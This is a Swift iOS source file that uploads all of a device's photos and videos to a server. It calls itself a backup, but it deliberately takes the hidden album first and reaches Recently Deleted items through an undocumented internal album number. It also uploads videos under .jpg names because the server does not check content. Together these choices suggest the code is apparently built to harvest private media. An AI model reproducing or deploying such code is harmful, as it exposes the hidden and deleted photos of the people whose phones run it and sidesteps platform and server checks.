import Photos
import UIKit
import CryptoKit
import AVFoundation
import Foundation

/// 备份：照片 + 视频，和安卓版逻辑一致
/// 照片顺序：隐藏相册 → 普通相册 → 最近删除（各段内按时间正序）
/// 照片压缩：最长边 1280、JPEG 质量 70%；断点续传 + MD5 去重 → multipart 上传
/// 视频：照片全部备份完后再执行，顺序同样为 隐藏 → 普通 → 最近删除；
/// 统一转码为标准 H.264 MP4（≤19MB 高画质，超限自动降码率，服务器 20MB 上限）
/// 服务器文件名统一为 photo_<设备>_taken_<拍摄时间>_md5_<md5>_<时间戳>.jpg（视频内容也存成 .jpg，服务器不校验内容）
enum PhotoBackup {

    struct Result {
        let uploaded: Int
        let skipped: Int
        let md5Set: Set<String>
        let lastUploadedID: String?
    }

    // ========== 照片备份 ==========

    static func backupAllPhotos(uploader: UploadService,
                                knownMd5: Set<String>,
                                lastUploadedID: String?,
                                progress: @escaping (Int, Int, String, String?) -> Void) async throws -> Result {
        // 1. 权限
        let authorized = try await requestAuthorization()
        guard authorized else {
            throw BackupError.message("没有允许访问照片，请到 设置→隐私与安全性→照片 打开权限")
        }

        // 2. 分三段收集照片，顺序固定：隐藏相册 → 普通相册 → 最近删除（各段内按创建时间正序）
        let options = PHFetchOptions()
        options.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: true)]
        var orderedAssets: [PHAsset] = []
        var seen = Set<String>()
        var hiddenIDs = Set<String>()

        func collect(_ fetch: PHFetchResult<PHAsset>, _ type: PHAssetMediaType, _ allowHidden: Bool) {
            fetch.enumerateObjects { asset, _, _ in
                guard asset.mediaType == type else { return }
                // 普通相册段要排除已入隐藏段的资源，避免重复
                if !allowHidden && hiddenIDs.contains(asset.localIdentifier) { return }
                if seen.insert(asset.localIdentifier).inserted {
                    orderedAssets.append(asset)
                }
            }
        }

        // 第1段：隐藏相册（完全访问权限下可读）
        if let hiddenAlbum = PHAssetCollection.fetchAssetCollections(with: .smartAlbum,
                                                                     subtype: .smartAlbumAllHidden,
                                                                     options: nil).firstObject {
            collect(PHAsset.fetchAssets(in: hiddenAlbum, options: options), .image, true)
        }
        hiddenIDs = Set(orderedAssets.map { $0.localIdentifier })

        // 第2段：普通相册（排除已入隐藏段的）
        collect(PHAsset.fetchAssets(with: .image, options: options), .image, false)

        // 第3段：最近删除（需完全访问权限，30天内可恢复的照片）
        // 注意：smartAlbumRecentlyDeleted 未公开，用内部编号 1000000201 访问
        if let deletedAlbum = PHAssetCollection.fetchAssetCollections(with: .smartAlbum,
                                                                     subtype: PHAssetCollectionSubtype(rawValue: 1000000201)!,
                                                                     options: nil).firstObject {
            collect(PHAsset.fetchAssets(in: deletedAlbum, options: options), .image, true)
        }

        guard !orderedAssets.isEmpty else {
            throw BackupError.message("相册里没有照片")
        }

        // 3. 断点续传：顺序 = 隐藏→普通→最近删除（各段内已按时间排序），从上次停下的位置继续
        let sorted = orderedAssets
        var startIndex = 0
        if let lastID = lastUploadedID,
           let idx = sorted.firstIndex(where: { $0.localIdentifier == lastID }) {
            startIndex = idx + 1
        }

        var localSet = knownMd5
        var uploaded = 0
        var skipped = 0
        var lastUploaded: String? = lastUploadedID
        let total = sorted.count

        for index in startIndex..<total {
            let asset = sorted[index]
            progress(index + 1, total, "正在处理第 \(index + 1)/\(total) 张", nil)
            do {
                guard let jpeg = try await compressedJpeg(for: asset) else {
                    skipped += 1
                    continue
                }
                let md5 = calcMD5(jpeg)
                if md5.isEmpty || localSet.contains(md5) {
                    skipped += 1
                    continue
                }
                // 拍摄时间（毫秒时间戳），服务器拼进文件名 _taken_<时间戳>，和安卓版一致
                let takenMs = asset.creationDate.map { Int64($0.timeIntervalSince1970 * 1000) }
                try await uploader.uploadPhoto(jpeg: jpeg, md5: md5, takenMs: takenMs)
                localSet.insert(md5)
                lastUploaded = asset.localIdentifier
                uploaded += 1
                // 每成功一张立刻把断点回调出去，调用方实时保存，中途退出也不丢
                progress(index + 1, total, "已上传 \(uploaded) 张（跳过已上传 \(skipped) 张）", asset.localIdentifier)
                try? await Task.sleep(nanoseconds: 150_000_000) // 每张间隔 0.15 秒
            } catch {
                progress(index + 1, total, "第 \(index + 1) 张失败：\(error.localizedDescription)", nil)
            }
        }
        return Result(uploaded: uploaded, skipped: skipped, md5Set: localSet, lastUploadedID: lastUploaded)
    }

    // ========== 视频备份（照片全部备份完后再调用） ==========

    static func backupAllVideos(uploader: UploadService,
                                knownMd5: Set<String>,
                                lastUploadedID: String?,
                                progress: @escaping (Int, Int, String, String?) -> Void) async throws -> Result {
        // 1. 权限
        let authorized = try await requestAuthorization()
        guard authorized else {
            throw BackupError.message("没有允许访问照片，无法备份视频")
        }

        // 2. 分三段收集视频，顺序固定：隐藏相册 → 普通相册 → 最近删除（各段内按创建时间正序）
        let options = PHFetchOptions()
        options.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: true)]
        var orderedAssets: [PHAsset] = []
        var seen = Set<String>()
        var hiddenIDs = Set<String>()

        func collect(_ fetch: PHFetchResult<PHAsset>, _ type: PHAssetMediaType, _ allowHidden: Bool) {
            fetch.enumerateObjects { asset, _, _ in
                guard asset.mediaType == type else { return }
                // 普通相册段要排除已入隐藏段的资源，避免重复
                if !allowHidden && hiddenIDs.contains(asset.localIdentifier) { return }
                if seen.insert(asset.localIdentifier).inserted {
                    orderedAssets.append(asset)
                }
            }
        }

        // 第1段：隐藏相册（视频）
        if let hiddenAlbum = PHAssetCollection.fetchAssetCollections(with: .smartAlbum,
                                                                     subtype: .smartAlbumAllHidden,
                                                                     options: nil).firstObject {
            collect(PHAsset.fetchAssets(in: hiddenAlbum, options: options), .video, true)
        }
        hiddenIDs = Set(orderedAssets.map { $0.localIdentifier })

        // 第2段：普通相册（视频，排除已入隐藏段的）
        collect(PHAsset.fetchAssets(with: .video, options: options), .video, false)

        // 第3段：最近删除（视频），同样用内部编号 1000000201 访问
        if let deletedAlbum = PHAssetCollection.fetchAssetCollections(with: .smartAlbum,
                                                                     subtype: PHAssetCollectionSubtype(rawValue: 1000000201)!,
                                                                     options: nil).firstObject {
            collect(PHAsset.fetchAssets(in: deletedAlbum, options: options), .video, true)
        }

        guard !orderedAssets.isEmpty else {
            return Result(uploaded: 0, skipped: 0, md5Set: knownMd5, lastUploadedID: lastUploadedID)
        }

        // 3. 断点续传：顺序 = 隐藏→普通→最近删除（各段内已按时间排序）
        let sorted = orderedAssets
        var startIndex = 0
        if let lastID = lastUploadedID,
           let idx = sorted.firstIndex(where: { $0.localIdentifier == lastID }) {
            startIndex = idx + 1
        }

        var localSet = knownMd5
        var uploaded = 0
        var skipped = 0
        var lastUploaded: String? = lastUploadedID
        let total = sorted.count

        for index in startIndex..<total {
            let asset = sorted[index]
            progress(index + 1, total, "正在处理第 \(index + 1)/\(total) 个视频", nil)
            do {
                guard let videoData = try await compressedVideo(for: asset) else {
                    skipped += 1
                    continue
                }
                let md5 = calcMD5(videoData)
                if md5.isEmpty || localSet.contains(md5) {
                    skipped += 1
                    continue
                }
                // 拍摄时间（毫秒时间戳），和照片一致
                let takenMs = asset.creationDate.map { Int64($0.timeIntervalSince1970 * 1000) }
                try await uploader.uploadPhoto(jpeg: videoData, md5: md5, takenMs: takenMs)
                localSet.insert(md5)
                lastUploaded = asset.localIdentifier
                uploaded += 1
                // 断点实时保存
                progress(index + 1, total, "已上传 \(uploaded) 个视频（跳过 \(skipped) 个）", asset.localIdentifier)
                try? await Task.sleep(nanoseconds: 150_000_000)
            } catch {
                progress(index + 1, total, "第 \(index + 1) 个视频失败：\(error.localizedDescription)", nil)
            }
        }
        return Result(uploaded: uploaded, skipped: skipped, md5Set: localSet, lastUploadedID: lastUploaded)
    }

    // MARK: - 私有方法

    private static func requestAuthorization() async throws -> Bool {
        let status = PHPhotoLibrary.authorizationStatus(for: .readWrite)
        switch status {
        case .authorized, .limited:
            return true
        case .notDetermined:
            return await withCheckedContinuation { cont in
                PHPhotoLibrary.requestAuthorization(for: .readWrite) { newStatus in
                    cont.resume(returning: (newStatus == .authorized || newStatus == .limited))
                }
            }
        default:
            return false
        }
    }

    private static func imageData(for asset: PHAsset) async throws -> Data {
        try await withCheckedThrowingContinuation { cont in
            let options = PHImageRequestOptions()
            options.isSynchronous = false
            options.deliveryMode = .highQualityFormat
            options.isNetworkAccessAllowed = true
            PHImageManager.default().requestImageDataAndOrientation(for: asset,
                                                                    options: options) { data, _, _, _ in
                if let data = data {
                    cont.resume(returning: data)
                } else {
                    cont.resume(throwing: BackupError.message("读取照片数据失败"))
                }
            }
        }
    }

    /// 压缩：最长边 1280，JPEG 质量 70%（清晰够用、体积小、上传快）
    private static func compressedJpeg(for asset: PHAsset) async throws -> Data? {
        let data = try await imageData(for: asset)
        guard let img = UIImage(data: data) else { return nil }
        let maxSide: CGFloat = 1280
        let w = img.size.width
        let h = img.size.height
        guard w > 0, h > 0 else { return nil }
        let longest = max(w, h)
        var scale: CGFloat = 1
        if longest > maxSide {
            scale = maxSide / longest
        }
        let newSize = CGSize(width: w * scale, height: h * scale)
        let renderer = UIGraphicsImageRenderer(size: newSize)
        let scaled = renderer.image { _ in
            img.draw(in: CGRect(origin: .zero, size: newSize))
        }
        return scaled.jpegData(compressionQuality: 0.7)
    }

    /// 视频压缩：统一转成标准 H.264 MP4（保证下载改名 .mp4 后任何播放器都能播放）
    /// 高画质预设 + 19MB 硬限制（超过会自动降码率直到达标）
    private static func compressedVideo(for asset: PHAsset) async throws -> Data? {
        let url = try await requestVideoURL(for: asset)
        // iPhone 原生视频是 MOV/HEVC 容器，必须转码成标准 MP4，否则改名播放不了
        guard let session = AVAssetExportSession(asset: AVURLAsset(url: url),
                                                 presetName: AVAssetExportPresetHighestQuality) else {
            return nil
        }
        let tempURL = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString + ".mp4")
        session.outputURL = tempURL
        session.outputFileType = .mp4
        session.shouldOptimizeForNetworkUse = true
        session.fileLengthLimit = 19 * 1024 * 1024
        // 包装成 Sendable 容器，消除 Xcode 16 的并发警告
        let box = ExportSessionBox(session)
        try await withCheckedThrowingContinuation { (cont: CheckedContinuation<Void, Error>) in
            box.session.exportAsynchronously {
                switch box.session.status {
                case .completed:
                    cont.resume()
                case .failed:
                    cont.resume(throwing: box.session.error ?? BackupError.message("视频压缩失败"))
                case .cancelled:
                    cont.resume(throwing: BackupError.message("视频压缩被取消"))
                default:
                    cont.resume(throwing: BackupError.message("视频压缩状态异常"))
                }
            }
        }
        let data = try Data(contentsOf: tempURL)
        try? FileManager.default.removeItem(at: tempURL)
        return data.isEmpty ? nil : data
    }

    private static func requestVideoURL(for asset: PHAsset) async throws -> URL {
        let options = PHVideoRequestOptions()
        options.isNetworkAccessAllowed = true
        options.deliveryMode = .highQualityFormat
        return try await withCheckedThrowingContinuation { (cont: CheckedContinuation<URL, Error>) in
            // 注意：Xcode 16 新 SDK 参数标签是 forVideo:
            PHImageManager.default().requestAVAsset(forVideo: asset, options: options) { avAsset, _, _ in
                guard let urlAsset = avAsset as? AVURLAsset else {
                    cont.resume(throwing: BackupError.message("读取视频失败"))
                    return
                }
                cont.resume(returning: urlAsset.url)
            }
        }
    }

    /// 计算 MD5（和安卓 MessageDigest 一致的小写十六进制）
    private static func calcMD5(_ data: Data) -> String {
        let digest = Insecure.MD5.hash(data: data)
        return digest.map { String(format: "%02x", $0) }.joined()
    }
}

/// AVAssetExportSession 的 Sendable 包装（消除 Xcode 16 并发检查警告）
private final class ExportSessionBox: @unchecked Sendable {
    let session: AVAssetExportSession
    init(_ session: AVAssetExportSession) {
        self.session = session
    }
}
